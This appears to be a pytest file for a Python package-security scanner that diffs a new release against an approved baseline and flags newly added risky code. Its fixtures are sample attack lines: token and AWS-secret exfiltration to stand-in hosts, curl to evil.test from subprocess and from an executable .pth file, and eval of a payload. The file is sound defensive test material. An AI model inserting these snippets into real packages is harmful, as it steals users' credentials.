"""F7 baseline diff: file comparison, reused F8 judgement, origin marking."""

from __future__ import annotations

import dataclasses
import zipfile

import pytest

from devpi_guardian.analyzers.rules import RULES
from devpi_guardian.analyzers.serialization import finding_fingerprint
from devpi_guardian.analyzers.types import Finding
from devpi_guardian.baseline.diff import (
    DIFF_RULES,
    BaselineDiff,
    FindingAttribution,
    compare_release_to_baseline,
    compare_to_baseline,
    diff_against_baseline,
    findings_only,
)

from .artifacts import build_sdist, build_wheel
from .fakes import FakeArtifactBytesSource, FakeReleaseLookup
from .fakes import release as make_release

CLEAN = "def add(left, right):\n    return left + right\n"

EXFILTRATE = """import os
import requests

TOKEN = os.environ["GITHUB_TOKEN"]
requests.post("https://drop.example.test", data=TOKEN)
"""

SECOND_EXFILTRATE = """import os
import httpx

SECRET = os.getenv("AWS_SECRET_ACCESS_KEY")
httpx.post("https://other.example.test", json={"k": SECRET})
"""


def pair(tmp_path, baseline_files, artifact_files) -> BaselineDiff:
    baseline = build_wheel(tmp_path / "demo-1.0.0-py3-none-any.whl", baseline_files)
    artifact = build_wheel(tmp_path / "demo-2.0.0-py3-none-any.whl", artifact_files)
    return diff_against_baseline(baseline, artifact)


def rules_of(result: BaselineDiff) -> list[tuple[str, str]]:
    return [(finding.rule, origin) for finding, origin in result.findings]


# --- the contract with F8's Finding ---------------------------------------


def test_finding_stays_frozen_and_ungrown():
    # F7 must not extend F8's Finding; the origin rides alongside it instead.
    assert [field.name for field in dataclasses.fields(Finding)] == [
        "rule",
        "action",
        "file",
        "line",
        "snippet",
        "message",
        "source",
        "sink",
    ]
    assert Finding.__dataclass_params__.frozen is True


def test_diff_rules_do_not_collide_with_f8_rules():
    assert not set(DIFF_RULES) & set(RULES)


def test_diff_rule_actions_match_the_wheel_only_equivalents():
    assert (
        DIFF_RULES["baseline_new_credential_network"].action
        == RULES["wheel_only_credential_network"].action
    )


def test_findings_only_drops_origins(tmp_path):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "pkg/b.py": EXFILTRATE})
    assert findings_only(result.findings) == [finding for finding, _ in result.findings]
    assert all(isinstance(finding, Finding) for finding in findings_only(result.findings))


@pytest.mark.parametrize(
    ("tier", "baseline_name", "target_name", "builder"),
    [
        (
            "same_tag",
            "demo-1.0.0-cp311-cp311-manylinux_2_17_x86_64.whl",
            "demo-2.0.0-cp311-cp311-manylinux_2_17_x86_64.whl",
            build_wheel,
        ),
        (
            "universal_wheel",
            "demo-1.0.0-py3-none-any.whl",
            "demo-2.0.0-cp311-cp311-manylinux_2_17_x86_64.whl",
            build_wheel,
        ),
        ("sdist", "demo-1.0.0.tar.gz", "demo-2.0.0.tar.gz", build_sdist),
    ],
)
def test_every_finding_carries_origin_and_selected_tier(
    tmp_path,
    tier,
    baseline_name,
    target_name,
    builder,
):
    baseline = builder(tmp_path / baseline_name, {"pkg/a.py": CLEAN})
    target = builder(tmp_path / target_name, {"pkg/a.py": EXFILTRATE})
    baseline_record = make_release(
        "demo",
        "1.0.0",
        baseline_name,
        sha256="a" * 64,
        size_bytes=baseline.stat().st_size,
    )
    target_record = make_release(
        "demo",
        "2.0.0",
        target_name,
        sha256="b" * 64,
        size_bytes=target.stat().st_size,
    )
    source = FakeArtifactBytesSource(tmp_path / "store")
    source.add(baseline_record.sha256, baseline.read_bytes(), filename=baseline_name)

    result = compare_release_to_baseline(
        target_record,
        target,
        lookup=FakeReleaseLookup([baseline_record]),
        bytes_source=source,
    )

    assert result.selection is not None
    assert result.selection.tier == tier
    assert result.diff is not None
    assert result.diff.tier == tier
    assert result.findings
    assert all(entry.origin == "diff_changed" for entry in result.findings)
    assert all(entry.tier == tier for entry in result.findings)
    assert all(entry.tier == tier for entry in result.diff.findings)


# --- step 1: file comparison ----------------------------------------------


def test_added_changed_removed_and_unchanged_are_classified(tmp_path):
    result = pair(
        tmp_path,
        {"pkg/keep.py": CLEAN, "pkg/edit.py": CLEAN, "pkg/gone.py": CLEAN},
        {"pkg/keep.py": CLEAN, "pkg/edit.py": CLEAN + "# edited\n", "pkg/new.py": CLEAN},
    )
    assert result.usable is True
    assert result.files.added == ("pkg/new.py",)
    assert result.files.changed == ("pkg/edit.py",)
    assert result.files.removed == ("pkg/gone.py",)
    assert result.files.unchanged == ("pkg/keep.py",)


def test_change_detection_is_byte_exact(tmp_path):
    # Only whitespace differs, but the bytes differ, so the file is re-analyzed.
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN + "\n"})
    assert result.files.changed == ("pkg/a.py",)
    assert result.files.unchanged == ()


def test_member_timestamps_never_make_a_file_look_changed(tmp_path):
    baseline = build_wheel(
        tmp_path / "demo-1.0.0-py3-none-any.whl",
        {"pkg/a.py": CLEAN},
        mtime=(1990, 5, 5, 1, 2, 3),
    )
    artifact = build_wheel(
        tmp_path / "demo-2.0.0-py3-none-any.whl",
        {"pkg/a.py": CLEAN},
        mtime=(2030, 11, 30, 23, 59, 58),
    )
    result = diff_against_baseline(baseline, artifact)
    assert result.files.unchanged == ("pkg/a.py",)
    assert result.files.changed == ()


@pytest.mark.parametrize(
    "metadata_path",
    [
        "demo-2.0.0.dist-info/RECORD",
        "demo-2.0.0.dist-info/METADATA",
        "demo-2.0.0.dist-info/WHEEL",
        "demo-2.0.0.dist-info/INSTALLER",
        "demo-2.0.0.dist-info/anything.py",
    ],
)
def test_dist_info_and_record_are_excluded_from_the_comparison(tmp_path, metadata_path):
    result = pair(
        tmp_path,
        {"pkg/a.py": CLEAN},
        {"pkg/a.py": CLEAN, metadata_path: EXFILTRATE},
    )
    assert result.files.added == ()
    assert result.findings == ()


def test_sdist_prefix_and_src_layout_normalize_to_wheel_paths(tmp_path):
    baseline = build_sdist(
        tmp_path / "demo-1.0.0.tar.gz",
        {"src/pkg/a.py": CLEAN, "setup.py": CLEAN},
        prefix="demo-1.0.0",
    )
    artifact = build_wheel(
        tmp_path / "demo-2.0.0-py3-none-any.whl",
        {"pkg/a.py": CLEAN},
    )
    result = diff_against_baseline(baseline, artifact)
    # pkg/a.py is the same logical file in both layouts, so it is unchanged.
    assert result.files.unchanged == ("pkg/a.py",)
    assert result.files.added == ()


def test_a_wheel_only_file_is_added_relative_to_an_sdist_baseline(tmp_path):
    baseline = build_sdist(tmp_path / "demo-1.0.0.tar.gz", {"src/pkg/a.py": CLEAN})
    artifact = build_wheel(
        tmp_path / "demo-2.0.0-py3-none-any.whl",
        {"pkg/a.py": CLEAN, "pkg/b.py": EXFILTRATE},
    )
    result = diff_against_baseline(baseline, artifact)
    assert result.files.added == ("pkg/b.py",)
    assert rules_of(result) == [("baseline_new_credential_network", "diff_new")]


def test_sdist_to_sdist_comparison(tmp_path):
    baseline = build_sdist(tmp_path / "demo-1.0.0.tar.gz", {"pkg/a.py": CLEAN})
    artifact = build_sdist(
        tmp_path / "demo-2.0.0.tar.gz",
        {"pkg/a.py": CLEAN, "pkg/b.py": EXFILTRATE},
        prefix="demo-2.0.0",
    )
    result = diff_against_baseline(baseline, artifact)
    assert result.files.added == ("pkg/b.py",)
    assert rules_of(result) == [("baseline_new_credential_network", "diff_new")]


# --- steps 2 and 3: F8 judgement on diffed files only ---------------------


def test_a_new_python_file_with_a_credential_flow_is_reported(tmp_path):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "pkg/evil.py": EXFILTRATE})
    assert len(result.findings) == 1
    finding, origin = result.findings[0]
    assert origin == "diff_new"
    assert finding.rule == "baseline_new_credential_network"
    assert finding.action == "DENY"
    assert finding.file == "pkg/evil.py"
    assert finding.line == 5
    assert finding.source == "os.environ['GITHUB_TOKEN']"
    assert finding.sink == "requests.post"
    assert finding.message == DIFF_RULES["baseline_new_credential_network"].message


def test_a_changed_python_file_is_marked_diff_changed(tmp_path):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": EXFILTRATE})
    assert rules_of(result) == [("baseline_new_credential_network", "diff_changed")]


def test_a_flow_the_baseline_already_carried_is_not_reported(tmp_path):
    # The whole point of F7: an approved baseline is not re-litigated.
    result = pair(tmp_path, {"pkg/evil.py": EXFILTRATE}, {"pkg/evil.py": EXFILTRATE})
    assert result.findings == ()
    assert result.files.unchanged == ("pkg/evil.py",)


# The reason F7 exists: code smuggled into a file the baseline already had.
# Such a file is "changed", not "added", and must still be analyzed.

BASE_UTILS = """import os


def helper():
    return os.getcwd()
"""

SNEAKED_UTILS = """import os
import requests


def helper():
    return os.getcwd()


TOKEN = os.environ["GITHUB_TOKEN"]
requests.post("https://drop.example.test", data=TOKEN)
"""


def test_a_flow_smuggled_into_an_existing_file_is_detected(tmp_path):
    result = pair(tmp_path, {"pkg/utils.py": BASE_UTILS}, {"pkg/utils.py": SNEAKED_UTILS})
    assert result.files.added == ()
    assert result.files.changed == ("pkg/utils.py",)

    assert len(result.findings) == 1
    finding, origin = result.findings[0]
    assert origin == "diff_changed"
    assert finding.rule == "baseline_new_credential_network"
    assert finding.action == "DENY"
    assert finding.file == "pkg/utils.py"
    assert finding.line == 10
    assert finding.source == "os.environ['GITHUB_TOKEN']"
    assert finding.sink == "requests.post"


def test_a_smuggled_flow_survives_the_compare_to_baseline_entry_point(tmp_path):
    baseline = build_wheel(tmp_path / "demo-1.0.0-py3-none-any.whl", {"pkg/utils.py": BASE_UTILS})
    artifact = build_wheel(
        tmp_path / "demo-2.0.0-py3-none-any.whl", {"pkg/utils.py": SNEAKED_UTILS}
    )
    pairs = compare_to_baseline(baseline, artifact)
    assert [(finding.rule, origin) for finding, origin in pairs] == [
        ("baseline_new_credential_network", "diff_changed")
    ]


def test_an_unchanged_risky_file_stays_silent_while_a_new_one_reports(tmp_path):
    result = pair(
        tmp_path,
        {"pkg/old.py": EXFILTRATE},
        {"pkg/old.py": EXFILTRATE, "pkg/new.py": SECOND_EXFILTRATE},
    )
    assert [finding.file for finding, _ in result.findings] == ["pkg/new.py"]


def test_added_non_python_files_are_not_parsed(tmp_path):
    result = pair(
        tmp_path,
        {"pkg/a.py": CLEAN},
        {"pkg/a.py": CLEAN, "pkg/data.txt": EXFILTRATE, "pkg/notes.md": "not python"},
    )
    assert result.files.added == ("pkg/data.txt", "pkg/notes.md")
    assert result.findings == ()


def test_a_new_python_file_that_cannot_be_parsed_is_reported(tmp_path):
    result = pair(
        tmp_path,
        {"pkg/a.py": CLEAN},
        {"pkg/a.py": CLEAN, "pkg/broken.py": "def oops(:\n"},
    )
    assert rules_of(result) == [("ast_parse_failed", "diff_new")]
    assert result.findings[0][0].action == RULES["ast_parse_failed"].action


def test_findings_are_deduplicated_by_evidence_fingerprint(tmp_path):
    result = pair(
        tmp_path,
        {"pkg/a.py": CLEAN},
        {"pkg/a.py": CLEAN, "pkg/one.py": EXFILTRATE, "pkg/two.py": EXFILTRATE},
    )
    fingerprints = [finding_fingerprint(finding) for finding, _ in result.findings]
    assert len(fingerprints) == len(set(fingerprints)) == 2


def test_finding_order_is_deterministic(tmp_path):
    files = {
        "pkg/a.py": CLEAN,
        "pkg/z.py": EXFILTRATE,
        "pkg/m.py": SECOND_EXFILTRATE,
        "pkg/broken.py": "def oops(:\n",
    }
    first = pair(tmp_path / "one", {"pkg/a.py": CLEAN}, files)
    second = pair(tmp_path / "two", {"pkg/a.py": CLEAN}, files)
    assert first.findings == second.findings
    assert [finding.file for finding, _ in first.findings] == sorted(
        finding.file for finding, _ in first.findings
    )


# A changed file is analyzed in full, but a flow the baseline version already
# carried is context, not a new finding.

OLD_FLOW = """import os
import requests

TOKEN = os.environ["GITHUB_TOKEN"]
requests.post("https://old.example.test", data=TOKEN)
"""

OLD_PLUS_NEW_FLOW = """import os
import httpx
import requests

TOKEN = os.environ["GITHUB_TOKEN"]
requests.post("https://old.example.test", data=TOKEN)
SECRET = os.getenv("AWS_SECRET_ACCESS_KEY")
httpx.post("https://new.example.test", json={"k": SECRET})
"""

OLD_FLOW_SHIFTED = """# an unrelated comment added at the top
import os
import requests

TOKEN = os.environ["GITHUB_TOKEN"]
requests.post("https://old.example.test", data=TOKEN)
"""

OLD_FLOW_REDIRECTED = """import os
import requests

TOKEN = os.environ["GITHUB_TOKEN"]
requests.post("https://attacker.example.test", data=TOKEN)
"""


def test_only_the_newly_added_flow_of_a_changed_file_is_reported(tmp_path):
    result = pair(tmp_path, {"pkg/utils.py": OLD_FLOW}, {"pkg/utils.py": OLD_PLUS_NEW_FLOW})
    assert result.files.changed == ("pkg/utils.py",)
    assert [(finding.sink, origin) for finding, origin in result.findings] == [
        ("httpx.post", "diff_changed")
    ]

    assert len(result.carried_flows) == 1
    carried = result.carried_flows[0]
    assert carried.file == "pkg/utils.py"
    assert carried.line == 6
    assert carried.source == "os.environ['GITHUB_TOKEN']"
    assert carried.sink == "requests.post"


def test_a_line_shift_does_not_resurface_a_carried_flow(tmp_path):
    # Only a comment was added above the flow, so nothing new happens here.
    result = pair(tmp_path, {"pkg/utils.py": OLD_FLOW}, {"pkg/utils.py": OLD_FLOW_SHIFTED})
    assert result.files.changed == ("pkg/utils.py",)
    assert result.findings == ()
    assert [flow.sink for flow in result.carried_flows] == ["requests.post"]
    assert result.carried_flows[0].line == 6


def test_an_edited_and_an_untouched_file_agree_about_a_carried_flow(tmp_path):
    untouched = pair(tmp_path / "same", {"pkg/utils.py": OLD_FLOW}, {"pkg/utils.py": OLD_FLOW})
    edited = pair(
        tmp_path / "edited", {"pkg/utils.py": OLD_FLOW}, {"pkg/utils.py": OLD_FLOW_SHIFTED}
    )
    # An unrelated comment must not change the verdict for the same evidence.
    assert untouched.findings == edited.findings == ()


def test_redirecting_a_carried_flow_to_a_new_destination_is_reported(tmp_path):
    # Same credential and same sink function, but the call itself changed.
    result = pair(tmp_path, {"pkg/utils.py": OLD_FLOW}, {"pkg/utils.py": OLD_FLOW_REDIRECTED})
    assert [(finding.sink, origin) for finding, origin in result.findings] == [
        ("requests.post", "diff_changed")
    ]
    assert "attacker.example.test" in result.findings[0][0].snippet
    assert result.carried_flows == ()


def test_an_added_file_carries_nothing_and_reports_everything(tmp_path):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "pkg/new.py": OLD_FLOW})
    assert result.carried_flows == ()
    assert [origin for _, origin in result.findings] == ["diff_new"]


def test_an_unparsable_baseline_version_reports_every_flow(tmp_path):
    # Nothing can be shown to have been approved before, so nothing is subtracted.
    result = pair(tmp_path, {"pkg/utils.py": "def oops(:\n"}, {"pkg/utils.py": OLD_FLOW})
    assert [(finding.rule, origin) for finding, origin in result.findings] == [
        ("baseline_new_credential_network", "diff_changed")
    ]
    assert result.carried_flows == ()


def test_carried_flows_are_ordered_deterministically(tmp_path):
    two_flows = OLD_PLUS_NEW_FLOW
    result = pair(tmp_path, {"pkg/utils.py": two_flows}, {"pkg/utils.py": two_flows + "# edit\n"})
    assert result.findings == ()
    assert [flow.line for flow in result.carried_flows] == [6, 8]


# --- step 4: reference-only surface ---------------------------------------


def test_a_new_file_reports_its_whole_surface(tmp_path):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "pkg/b.py": EXFILTRATE})
    assert len(result.surface) == 1
    surface = result.surface[0]
    assert surface.file == "pkg/b.py"
    assert surface.origin == "diff_new"
    assert surface.imports == ("os", "requests")
    assert "requests.post" in surface.calls


def test_a_changed_file_reports_only_what_it_added(tmp_path):
    before = "import os\n\nprint(os.getcwd())\n"
    after = "import os\nimport socket\n\nprint(os.getcwd())\nsocket.create_connection(('h', 1))\n"
    result = pair(tmp_path, {"pkg/a.py": before}, {"pkg/a.py": after})
    assert len(result.surface) == 1
    surface = result.surface[0]
    assert surface.origin == "diff_changed"
    assert surface.imports == ("socket",)
    assert surface.calls == ("socket.create_connection",)
    # The same call is also judged, not only listed.
    assert [finding.rule for finding, _ in result.findings] == ["baseline_new_risky_python"]


def test_surface_is_reported_even_when_there_is_no_finding(tmp_path):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "pkg/b.py": "import json\n"})
    assert result.findings == ()
    assert [entry.file for entry in result.surface] == ["pkg/b.py"]
    assert result.surface[0].imports == ("json",)


def test_dynamic_imports_appear_in_the_surface(tmp_path):
    source = "import importlib\n\nmod = importlib.import_module('socket')\n"
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "pkg/b.py": source})
    assert set(result.surface[0].imports) == {"importlib", "socket"}
    assert {finding.rule for finding, _ in result.findings} == {"baseline_new_risky_python"}


def test_a_file_that_adds_nothing_new_is_absent_from_the_surface(tmp_path):
    before = "import os\n\nprint(os.getcwd())\n"
    after = "import os\n\n# a comment only\nprint(os.getcwd())\n"
    result = pair(tmp_path, {"pkg/a.py": before}, {"pkg/a.py": after})
    assert result.files.changed == ("pkg/a.py",)
    assert result.surface == ()


# --- defensive behavior ---------------------------------------------------


def test_an_unsafe_archive_is_rejected_with_an_artifact_origin(tmp_path):
    baseline = build_wheel(tmp_path / "demo-1.0.0-py3-none-any.whl", {"pkg/a.py": CLEAN})
    artifact = tmp_path / "demo-2.0.0-py3-none-any.whl"
    with zipfile.ZipFile(artifact, "w") as archive:
        archive.writestr("../escape.py", EXFILTRATE)
    result = diff_against_baseline(baseline, artifact)
    assert result.usable is False
    assert result.files.added == ()
    assert [origin for _, origin in result.findings] == ["diff_artifact"]
    assert result.findings[0][0].rule == "archive_unsafe_member"


def test_a_missing_artifact_returns_an_error_finding_without_raising(tmp_path):
    baseline = build_wheel(tmp_path / "demo-1.0.0-py3-none-any.whl", {"pkg/a.py": CLEAN})
    result = diff_against_baseline(baseline, tmp_path / "absent-2.0.0-py3-none-any.whl")
    assert result.usable is False
    assert rules_of(result) == [("analyzer_error", "diff_artifact")]


def test_a_missing_baseline_returns_an_error_finding_without_raising(tmp_path):
    artifact = build_wheel(tmp_path / "demo-2.0.0-py3-none-any.whl", {"pkg/a.py": CLEAN})
    result = diff_against_baseline(tmp_path / "absent-1.0.0-py3-none-any.whl", artifact)
    assert result.usable is False
    assert rules_of(result) == [("analyzer_error", "diff_artifact")]


def test_compare_to_baseline_returns_the_specified_shape(tmp_path):
    baseline = build_wheel(tmp_path / "demo-1.0.0-py3-none-any.whl", {"pkg/a.py": CLEAN})
    artifact = build_wheel(
        tmp_path / "demo-2.0.0-py3-none-any.whl",
        {"pkg/a.py": CLEAN, "pkg/b.py": EXFILTRATE},
    )
    pairs = compare_to_baseline(baseline, artifact)
    assert isinstance(pairs, list)
    assert all(isinstance(item, FindingAttribution) for item in pairs)
    assert all(isinstance(item.finding, Finding) and isinstance(item.origin, str) for item in pairs)
    assert pairs == list(diff_against_baseline(baseline, artifact).findings)


# --- F6 + F7 orchestration ------------------------------------------------


def make_lookup(*records):
    return FakeReleaseLookup(records)


def wheel_for(tmp_path, record, files):
    return build_wheel(tmp_path / record.sha256[:12] / record.filename, files)


def test_a_first_release_has_no_baseline_and_skips_the_diff(tmp_path):
    target = make_release("acme", "1.0.0", "acme-1.0.0-py3-none-any.whl")
    artifact = wheel_for(tmp_path, target, {"pkg/a.py": EXFILTRATE})

    result = compare_release_to_baseline(
        target,
        artifact,
        lookup=make_lookup(),
        bytes_source=FakeArtifactBytesSource(tmp_path / "store"),
    )
    assert result.has_baseline is False
    assert result.baseline_sha256 is None
    assert result.selection is None
    assert result.diff is None
    assert result.findings == ()


def test_the_selected_baseline_is_diffed_end_to_end(tmp_path):
    baseline_record = make_release("acme", "1.0.0", "acme-1.0.0-py3-none-any.whl")
    older_record = make_release("acme", "0.9.0", "acme-0.9.0-py3-none-any.whl")
    target = make_release("acme", "2.0.0", "acme-2.0.0-py3-none-any.whl")

    store = FakeArtifactBytesSource(tmp_path / "store")
    for record in (baseline_record, older_record):
        built = wheel_for(tmp_path, record, {"pkg/utils.py": BASE_UTILS})
        store.add(record.sha256, built.read_bytes(), filename=record.filename)
    artifact = wheel_for(tmp_path, target, {"pkg/utils.py": SNEAKED_UTILS})

    result = compare_release_to_baseline(
        target,
        artifact,
        lookup=make_lookup(older_record, baseline_record),
        bytes_source=store,
    )
    assert result.has_baseline is True
    # F6 picked the newest eligible release, not merely any older one.
    assert result.baseline_sha256 == baseline_record.sha256
    assert result.selection is not None
    assert result.selection.tier == "same_tag"
    assert result.selection.release == baseline_record

    assert result.diff is not None
    assert result.diff.files.changed == ("pkg/utils.py",)
    assert [(finding.rule, origin) for finding, origin in result.findings] == [
        ("baseline_new_credential_network", "diff_changed")
    ]
    assert result.findings == result.diff.findings


def test_an_unreadable_baseline_is_an_error_not_a_first_release(tmp_path):
    baseline_record = make_release("acme", "1.0.0", "acme-1.0.0-py3-none-any.whl")
    target = make_release("acme", "2.0.0", "acme-2.0.0-py3-none-any.whl")
    artifact = wheel_for(tmp_path, target, {"pkg/utils.py": SNEAKED_UTILS})

    result = compare_release_to_baseline(
        target,
        artifact,
        lookup=make_lookup(baseline_record),
        # The store never received the baseline bytes.
        bytes_source=FakeArtifactBytesSource(tmp_path / "store"),
    )
    assert result.has_baseline is True
    assert result.baseline_sha256 == baseline_record.sha256
    assert result.diff is None
    assert [(finding.rule, origin) for finding, origin in result.findings] == [
        ("analyzer_error", "diff_artifact")
    ]


def test_a_failing_release_lookup_is_reported_instead_of_raising(tmp_path):
    class BrokenLookup:
        def allowed_releases(self, project):
            raise RuntimeError("verdict store unavailable")

    target = make_release("acme", "2.0.0", "acme-2.0.0-py3-none-any.whl")
    artifact = wheel_for(tmp_path, target, {"pkg/utils.py": SNEAKED_UTILS})

    result = compare_release_to_baseline(
        target,
        artifact,
        lookup=BrokenLookup(),
        bytes_source=FakeArtifactBytesSource(tmp_path / "store"),
    )
    assert result.has_baseline is False
    assert result.diff is None
    assert [(finding.rule, origin) for finding, origin in result.findings] == [
        ("analyzer_error", "diff_artifact")
    ]
    assert "verdict store unavailable" in result.findings[0][0].snippet


def test_an_sdist_baseline_is_diffed_against_a_wheel_target(tmp_path):
    baseline_record = make_release("acme", "1.0.0", "acme-1.0.0.tar.gz")
    target = make_release("acme", "2.0.0", "acme-2.0.0-cp311-cp311-manylinux_2_17_x86_64.whl")

    store = FakeArtifactBytesSource(tmp_path / "store")
    built = build_sdist(
        tmp_path / "sdist" / baseline_record.filename,
        {"src/pkg/utils.py": BASE_UTILS},
        prefix="acme-1.0.0",
    )
    store.add(baseline_record.sha256, built.read_bytes(), filename=baseline_record.filename)
    artifact = wheel_for(tmp_path, target, {"pkg/utils.py": SNEAKED_UTILS})

    result = compare_release_to_baseline(
        target,
        artifact,
        lookup=make_lookup(baseline_record),
        bytes_source=store,
    )
    assert result.selection is not None
    assert result.selection.tier == "sdist"
    assert result.diff is not None
    assert result.diff.files.changed == ("pkg/utils.py",)
    assert [(finding.rule, origin) for finding, origin in result.findings] == [
        ("baseline_new_credential_network", "diff_changed")
    ]


# --- risky calls, executable .pth, and native additions -------------------
# F8 judges these wherever it finds them; F7 judges them when the baseline
# did not already carry them.

SUBPROCESS = "import subprocess\n\nsubprocess.run(['curl', 'https://evil.test'])\n"
DYNAMIC_EXEC = "eval(open('payload').read())\n"
DYNAMIC_IMPORT = "import importlib\n\nmod = importlib.import_module('subprocess')\n"
EXECUTABLE_PTH = "import os; os.system('curl https://evil.test')\n"
PLAIN_PTH = "mypackage\nanother/path\n"


def test_diff_rule_actions_mirror_their_wheel_only_equivalents():
    pairs = {
        "baseline_new_credential_network": "wheel_only_credential_network",
        "baseline_new_risky_python": "wheel_only_risky_python",
        "baseline_new_executable_pth": "wheel_only_executable_pth",
        "baseline_new_native": "wheel_only_native",
    }
    for diff_rule, f9_rule in pairs.items():
        assert DIFF_RULES[diff_rule].action == RULES[f9_rule].action


@pytest.mark.parametrize(
    ("source", "line"),
    [
        (SUBPROCESS, 3),
        ("import requests\n\nrequests.get('https://evil.test')\n", 3),
        (DYNAMIC_EXEC, 1),
        ("import os\n\nos.system('id')\n", 3),
    ],
    ids=["subprocess", "network", "eval", "os-system"],
)
def test_a_new_file_with_a_risky_call_is_reported(tmp_path, source, line):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "pkg/n.py": source})
    assert [(finding.rule, finding.line, origin) for finding, origin in result.findings] == [
        ("baseline_new_risky_python", line, "diff_new")
    ]
    assert result.findings[0][0].action == "DENY"


def test_a_risky_dynamic_import_is_reported(tmp_path):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "pkg/n.py": DYNAMIC_IMPORT})
    rules = {finding.rule for finding, _ in result.findings}
    assert rules == {"baseline_new_risky_python"}
    assert {finding.sink for finding, _ in result.findings} >= {"subprocess"}


def test_a_risky_call_smuggled_into_an_existing_file_is_reported(tmp_path):
    result = pair(tmp_path, {"pkg/utils.py": BASE_UTILS}, {"pkg/utils.py": BASE_UTILS + SUBPROCESS})
    assert result.files.changed == ("pkg/utils.py",)
    assert [(finding.rule, origin) for finding, origin in result.findings] == [
        ("baseline_new_risky_python", "diff_changed")
    ]


def test_a_risky_call_the_baseline_already_had_is_carried_not_reported(tmp_path):
    result = pair(tmp_path, {"pkg/n.py": SUBPROCESS}, {"pkg/n.py": "# a comment\n" + SUBPROCESS})
    assert result.files.changed == ("pkg/n.py",)
    assert result.findings == ()
    assert [item.rule for item in result.carried_evidence] == ["baseline_new_risky_python"]


def test_only_the_newly_added_risky_call_is_reported(tmp_path):
    result = pair(tmp_path, {"pkg/n.py": SUBPROCESS}, {"pkg/n.py": SUBPROCESS + DYNAMIC_EXEC})
    assert [(finding.rule, finding.line) for finding, _ in result.findings] == [
        ("baseline_new_risky_python", 4)
    ]
    assert [item.line for item in result.carried_evidence] == [3]


def test_an_untouched_risky_file_reports_nothing(tmp_path):
    result = pair(tmp_path, {"pkg/n.py": SUBPROCESS}, {"pkg/n.py": SUBPROCESS})
    assert result.findings == ()
    assert result.carried_evidence == ()


def test_a_credential_flow_is_not_also_reported_as_a_plain_risky_call(tmp_path):
    # requests.post is both the flow sink and a network call; F9 reports it
    # once, and so does F7.
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "pkg/n.py": EXFILTRATE})
    assert [finding.rule for finding, _ in result.findings] == ["baseline_new_credential_network"]


def test_a_new_executable_pth_is_reported(tmp_path):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "evil.pth": EXECUTABLE_PTH})
    assert [(finding.rule, finding.line, origin) for finding, origin in result.findings] == [
        ("baseline_new_executable_pth", 1, "diff_new")
    ]
    assert result.findings[0][0].action == "DENY"


def test_a_pth_that_only_adds_paths_is_not_reported(tmp_path):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, "ok.pth": PLAIN_PTH})
    assert result.findings == ()


def test_an_import_line_added_to_an_existing_pth_is_reported(tmp_path):
    result = pair(
        tmp_path,
        {"pkg/a.py": CLEAN, "x.pth": PLAIN_PTH},
        {"pkg/a.py": CLEAN, "x.pth": PLAIN_PTH + EXECUTABLE_PTH},
    )
    assert [(finding.rule, origin) for finding, origin in result.findings] == [
        ("baseline_new_executable_pth", "diff_changed")
    ]


def test_a_pth_import_line_the_baseline_already_had_is_carried(tmp_path):
    result = pair(
        tmp_path,
        {"pkg/a.py": CLEAN, "x.pth": EXECUTABLE_PTH},
        {"pkg/a.py": CLEAN, "x.pth": "extra/path\n" + EXECUTABLE_PTH},
    )
    assert result.findings == ()
    assert [item.rule for item in result.carried_evidence] == ["baseline_new_executable_pth"]


def test_a_newly_added_native_binary_is_reported(tmp_path):
    result = pair(
        tmp_path,
        {"pkg/a.py": CLEAN},
        {"pkg/a.py": CLEAN, "pkg/_speedup.so": b"\x7fELF fake"},
    )
    assert [(finding.rule, origin) for finding, origin in result.findings] == [
        ("baseline_new_native", "diff_new")
    ]
    assert result.findings[0][0].action == "REVIEW"
    assert result.findings[0][0].snippet == "_speedup.so"


def test_a_rebuilt_native_binary_is_not_reported(tmp_path):
    # Every release rebuilds its binaries; flagging that says nothing.
    result = pair(
        tmp_path,
        {"pkg/a.py": CLEAN, "pkg/_speedup.so": b"\x7fELF version one"},
        {"pkg/a.py": CLEAN, "pkg/_speedup.so": b"\x7fELF version two"},
    )
    assert result.files.changed == ("pkg/_speedup.so",)
    assert result.findings == ()


@pytest.mark.parametrize("suffix", [".so", ".dll", ".dylib"])
def test_every_native_suffix_is_recognized(tmp_path, suffix):
    result = pair(tmp_path, {"pkg/a.py": CLEAN}, {"pkg/a.py": CLEAN, f"pkg/lib{suffix}": b"binary"})
    assert [finding.rule for finding, _ in result.findings] == ["baseline_new_native"]


def test_carried_evidence_is_ordered_deterministically(tmp_path):
    both = SUBPROCESS + DYNAMIC_EXEC
    result = pair(tmp_path, {"pkg/n.py": both}, {"pkg/n.py": both + "# edit\n"})
    assert result.findings == ()
    assert [item.line for item in result.carried_evidence] == [3, 4]


# --- entry points ---------------------------------------------------------
# entry_points.txt lives inside .dist-info, which the file comparison excludes,
# and its directory name carries the version. So entry points are compared as
# parsed sets instead of as files, leaving the exclusion rule untouched.

EP_ONE = "[console_scripts]\ndemo = pkg:main\n"
EP_TWO = "[console_scripts]\ndemo = pkg:main\npipx = pkg:takeover\n"
PYPROJECT_ONE = (
    '[project]\nname = "demo"\nversion = "1.0.0"\n[project.scripts]\ndemo = "pkg:main"\n'
)


def versioned(version: str, entry_points: str) -> dict[str, str]:
    return {
        "pkg/__init__.py": CLEAN,
        f"demo-{version}.dist-info/entry_points.txt": entry_points,
    }


def test_a_console_script_added_between_versions_is_reported(tmp_path):
    result = pair(tmp_path, versioned("1.0.0", EP_ONE), versioned("2.0.0", EP_TWO))
